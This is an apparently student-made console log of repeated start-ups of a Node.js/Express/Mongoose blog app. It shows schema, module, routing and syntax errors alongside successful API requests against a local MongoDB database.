
> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www


/home/bitnami/lab4/blogger/node_modules/mongoose/lib/index.js:434
      throw new mongoose.Error.MissingSchemaError(name);
      ^
MissingSchemaError: Schema hasn't been registered for model "Blog".
Use mongoose.model(name, schema)
    at new MissingSchemaError (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/error/missingSchema.js:22:11)
    at Mongoose.model (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/index.js:434:13)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/controllers/blog.js:2:26)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/routes/index.js:3:17)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-25T21_30_24_463Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www


/home/bitnami/lab4/blogger/node_modules/mongoose/lib/index.js:434
      throw new mongoose.Error.MissingSchemaError(name);
      ^
MissingSchemaError: Schema hasn't been registered for model "Blog".
Use mongoose.model(name, schema)
    at new MissingSchemaError (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/error/missingSchema.js:22:11)
    at Mongoose.model (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/index.js:434:13)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/controllers/blog.js:2:26)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/routes/index.js:3:17)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-25T21_48_35_930Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www


/home/bitnami/lab4/blogger/node_modules/mongoose/lib/index.js:434
      throw new mongoose.Error.MissingSchemaError(name);
      ^
MissingSchemaError: Schema hasn't been registered for model "Blog".
Use mongoose.model(name, schema)
    at new MissingSchemaError (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/error/missingSchema.js:22:11)
    at Mongoose.model (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/index.js:434:13)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/controllers/blog.js:2:26)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/routes/index.js:3:17)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-25T21_58_26_586Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www


/home/bitnami/lab4/blogger/node_modules/mongoose/lib/index.js:434
      throw new mongoose.Error.MissingSchemaError(name);
      ^
MissingSchemaError: Schema hasn't been registered for model "Blog".
Use mongoose.model(name, schema)
    at new MissingSchemaError (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/error/missingSchema.js:22:11)
    at Mongoose.model (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/index.js:434:13)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/controllers/blog.js:2:26)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/routes/index.js:3:17)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-25T21_59_05_474Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www


/home/bitnami/lab4/blogger/node_modules/mongoose/lib/index.js:434
      throw new mongoose.Error.MissingSchemaError(name);
      ^
MissingSchemaError: Schema hasn't been registered for model "blog".
Use mongoose.model(name, schema)
    at new MissingSchemaError (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/error/missingSchema.js:22:11)
    at Mongoose.model (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/index.js:434:13)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/controllers/blog.js:2:26)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/routes/index.js:3:17)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-25T21_59_34_757Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

module.js:549
    throw err;
    ^

Error: Cannot find module '../controllers/blogs'
    at Function.Module._resolveFilename (module.js:547:15)
    at Function.Module._load (module.js:474:25)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/routes/index.js:3:17)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-25T22_16_53_201Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

/home/bitnami/lab4/blogger/node_modules/express/lib/router/index.js:458
      throw new TypeError('Router.use() requires middleware function but got a ' + gettype(fn));
      ^

TypeError: Router.use() requires middleware function but got a Object
    at Function.use (/home/bitnami/lab4/blogger/node_modules/express/lib/router/index.js:458:13)
    at Function.<anonymous> (/home/bitnami/lab4/blogger/node_modules/express/lib/application.js:220:21)
    at Array.forEach (<anonymous>)
    at Function.use (/home/bitnami/lab4/blogger/node_modules/express/lib/application.js:217:7)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app.js:27:5)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/bin/www:7:11)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-25T22_32_06_197Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

/home/bitnami/lab4/blogger/node_modules/express/lib/router/index.js:458
      throw new TypeError('Router.use() requires middleware function but got a ' + gettype(fn));
      ^

TypeError: Router.use() requires middleware function but got a Object
    at Function.use (/home/bitnami/lab4/blogger/node_modules/express/lib/router/index.js:458:13)
    at Function.<anonymous> (/home/bitnami/lab4/blogger/node_modules/express/lib/application.js:220:21)
    at Array.forEach (<anonymous>)
    at Function.use (/home/bitnami/lab4/blogger/node_modules/express/lib/application.js:217:7)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app.js:27:5)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/bin/www:7:11)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-25T22_39_48_945Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

/home/bitnami/lab4/blogger/node_modules/express/lib/router/index.js:458
      throw new TypeError('Router.use() requires middleware function but got a ' + gettype(fn));
      ^

TypeError: Router.use() requires middleware function but got a Object
    at Function.use (/home/bitnami/lab4/blogger/node_modules/express/lib/router/index.js:458:13)
    at Function.<anonymous> (/home/bitnami/lab4/blogger/node_modules/express/lib/application.js:220:21)
    at Array.forEach (<anonymous>)
    at Function.use (/home/bitnami/lab4/blogger/node_modules/express/lib/application.js:217:7)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app.js:27:5)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/bin/www:7:11)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-25T22_45_08_918Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

/home/bitnami/lab4/blogger/node_modules/express/lib/router/index.js:458
      throw new TypeError('Router.use() requires middleware function but got a ' + gettype(fn));
      ^

TypeError: Router.use() requires middleware function but got a Object
    at Function.use (/home/bitnami/lab4/blogger/node_modules/express/lib/router/index.js:458:13)
    at Function.<anonymous> (/home/bitnami/lab4/blogger/node_modules/express/lib/application.js:220:21)
    at Array.forEach (<anonymous>)
    at Function.use (/home/bitnami/lab4/blogger/node_modules/express/lib/application.js:217:7)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app.js:27:5)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/bin/www:7:11)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-25T22_53_09_159Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
Port 80 is already in use
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T08_27_35_379Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
Mongoose connected to mongodb://localhost/Blogger
[0mGET / [36m304 [0m13.713 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.908 ms - -[0m
[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m0.405 ms - -[0m
[0mGET /bootstrap/js/jquery.min.js [33m404 [0m2.392 ms - 1539[0m
[0mGET /bootstrap/css/fontawesome-all.css [33m404 [0m3.698 ms - 1539[0m
[0mGET /bootstrap/js/bootstrap.min.js [36m304 [0m0.248 ms - -[0m
Finding blog details { blogid: '1232' }
[0mGET /api/blogs/1232 [31m500 [0m3.209 ms - 1646[0m
Killed
npm ERR! code ELIFECYCLE
npm ERR! errno 137
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 137
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T08_30_26_623Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
Mongoose connected to mongodb://localhost/Blogger
Finding blog details { blogid: '1232' }
[0mGET /api/blogs/1232 [33m404 [0m12.484 ms - 30[0m
[0mDELETE /api//blogs/5c731c1b872de1ce8a0b7784 [32m200 [0m19.853 ms - 30[0m
Finding blog details { blogid: '5c731c1b872de1ce8a0b7784' }
[0mGET /api//blogs/5c731c1b872de1ce8a0b7784 [33m404 [0m12.029 ms - 30[0m
Killed
npm ERR! code ELIFECYCLE
npm ERR! errno 137
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 137
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T08_46_02_976Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
Mongoose connected to mongodb://blogUser:12345678@localhost/Blogger
Finding blog details { blogid: '5c731c1b872de1ce8a0b7784' }
{ _id: 5c731c1b872de1ce8a0b7784,
  blogTitle: 'First Blog Title',
  blogText: 'First Blog Text',
  dateOfCreation: 3030-02-24T03:24:00.000Z }
[0mGET /api//blogs/5c731c1b872de1ce8a0b7784 [32m200 [0m34.882 ms - 138[0m
[0mGET / [32m200 [0m9.193 ms - 967[0m
Killed
npm ERR! code ELIFECYCLE
npm ERR! errno 137
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 137
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T08_58_46_186Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
Mongoose connected to mongodb://blogUser:12345678@localhost/Blogger
Getting blogs list
[ { _id: 5c731c1b872de1ce8a0b7784,
    blogTitle: 'First Blog Title',
    blogText: 'First Blog Text',
    dateOfCreation: 3030-02-24T03:24:00.000Z },
  { _id: 5c731c3e872de1ce8a0b7785,
    blogTitle: '2nd Blog Title',
    blogText: '2nd Blog Text',
    dateOfCreation: 3040-02-24T03:24:00.000Z },
  { _id: 5c731c59872de1ce8a0b7786,
    blogTitle: '3rd Blog Title',
    blogText: '3rd Blog Text',
    dateOfCreation: 3050-02-24T03:24:00.000Z } ]
[0mGET /api//blogs [32m200 [0m36.370 ms - 410[0m
[0mGET / [32m200 [0m8.114 ms - 967[0m
[0mGET / [32m200 [0m1.327 ms - 967[0m
Killed
npm ERR! code ELIFECYCLE
npm ERR! errno 137
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 137
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T09_23_47_891Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
Mongoose connected to mongodb://blogUser:12345678@localhost/Blogger
{ blogTitle: 'postTestTitlte',
  blogText: 'postTestBlogText',
  dateOfCreation: '3030-02-24T03:24:00Z' }
{ _id: 5c9c92ac9524221232d27c4b,
  blogTitle: 'postTestTitlte',
  blogText: 'postTestBlogText',
  dateOfCreation: 3030-02-24T03:24:00.000Z,
  __v: 0 }
[0mPOST /api//blogs [32m201 [0m40.189 ms - 145[0m
{ blogTitle: 'postTestTitlte',
  blogText: 'postTestBlogText',
  dateOfCreation: 'sdfd' }
{ ValidationError: Blog validation failed: dateOfCreation: Cast to Date failed for value "sdfd" at path "dateOfCreation"
    at ValidationError.inspect (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/error/validation.js:59:24)
    at formatValue (util.js:400:38)
    at inspect (util.js:294:10)
    at format (util.js:161:12)
    at Console.log (console.js:130:21)
    at /home/bitnami/lab4/blogger/app_api/controllers/blogs.js:54:19
    at /home/bitnami/lab4/blogger/node_modules/mongoose/lib/model.js:4698:16
    at /home/bitnami/lab4/blogger/node_modules/mongoose/lib/utils.js:255:11
    at parallel (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/model.js:2808:16)
    at /home/bitnami/lab4/blogger/node_modules/async/internal/parallel.js:39:9
    at /home/bitnami/lab4/blogger/node_modules/async/internal/once.js:12:16
    at iteratorCallback (/home/bitnami/lab4/blogger/node_modules/async/eachOf.js:60:13)
    at /home/bitnami/lab4/blogger/node_modules/async/internal/onlyOnce.js:12:16
    at /home/bitnami/lab4/blogger/node_modules/async/internal/parallel.js:36:13
    at callbackWrapper (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/model.js:2781:20)
    at /home/bitnami/lab4/blogger/node_modules/mongoose/lib/model.js:4698:16
  errors: 
   { dateOfCreation: 
      { CastError: Cast to Date failed for value "sdfd" at path "dateOfCreation"
    at new CastError (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/error/cast.js:29:11)
    at model.$set (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/document.js:1030:7)
    at model._handleIndex (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/document.js:806:14)
    at model.$set (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/document.js:756:22)
    at model.Document (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/document.js:119:12)
    at model.Model (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/model.js:93:12)
    at new model (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/model.js:4542:13)
    at toExecute.push.callback (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/model.js:2788:22)
    at /home/bitnami/lab4/blogger/node_modules/async/internal/parallel.js:31:39
    at eachOfArrayLike (/home/bitnami/lab4/blogger/node_modules/async/eachOf.js:65:9)
    at exports.default (/home/bitnami/lab4/blogger/node_modules/async/eachOf.js:9:5)
    at _parallel (/home/bitnami/lab4/blogger/node_modules/async/internal/parallel.js:30:5)
    at parallelLimit (/home/bitnami/lab4/blogger/node_modules/async/parallel.js:88:26)
    at utils.promiseOrCallback.cb (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/model.js:2798:5)
    at Object.promiseOrCallback (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/utils.js:248:12)
    at Function.create (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/model.js:2759:16)
        message: 'Cast to Date failed for value "sdfd" at path "dateOfCreation"',
        name: 'CastError',
        stringValue: '"sdfd"',
        kind: 'Date',
        value: 'sdfd',
        path: 'dateOfCreation',
        reason: [Object] } },
  _message: 'Blog validation failed',
  name: 'ValidationError' }
[0mPOST /api//blogs [33m400 [0m6.565 ms - 571[0m
Killed
npm ERR! code ELIFECYCLE
npm ERR! errno 137
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 137
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T09_33_20_298Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
/home/bitnami/lab4/blogger/app_api/controllers/blogs.js:100
             { $set: {"dateOfCreation": req.body.dateOfCreation}}
                                                                ^

SyntaxError: missing ) after argument list
    at createScript (vm.js:80:10)
    at Object.runInThisContext (vm.js:139:10)
    at Module._compile (module.js:616:28)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/routes/index.js:13:17)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T09_33_25_002Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
/home/bitnami/lab4/blogger/app_api/controllers/blogs.js:100
             { $set: {"dateOfCreation": req.body.dateOfCreation}}
                                                                ^

SyntaxError: missing ) after argument list
    at createScript (vm.js:80:10)
    at Object.runInThisContext (vm.js:139:10)
    at Module._compile (module.js:616:28)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/routes/index.js:13:17)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T09_36_49_339Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
/home/bitnami/lab4/blogger/app_api/controllers/blogs.js:101
	     function(err, response) {
	             ^

SyntaxError: Unexpected token (
    at createScript (vm.js:80:10)
    at Object.runInThisContext (vm.js:139:10)
    at Module._compile (module.js:616:28)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/routes/index.js:13:17)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T09_37_44_117Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
/home/bitnami/lab4/blogger/app_api/controllers/blogs.js:101
	     function(err, response) {
	             ^

SyntaxError: Unexpected token (
    at createScript (vm.js:80:10)
    at Object.runInThisContext (vm.js:139:10)
    at Module._compile (module.js:616:28)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/routes/index.js:13:17)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T09_48_09_157Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
/home/bitnami/lab4/blogger/app_api/controllers/blogs.js:99
	     { $set: {"blogText": req.body.blogText}}//,
	                                            ^

SyntaxError: missing ) after argument list
    at createScript (vm.js:80:10)
    at Object.runInThisContext (vm.js:139:10)
    at Module._compile (module.js:616:28)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/routes/index.js:13:17)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T09_49_50_917Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
/home/bitnami/lab4/blogger/app_api/controllers/blogs.js:100
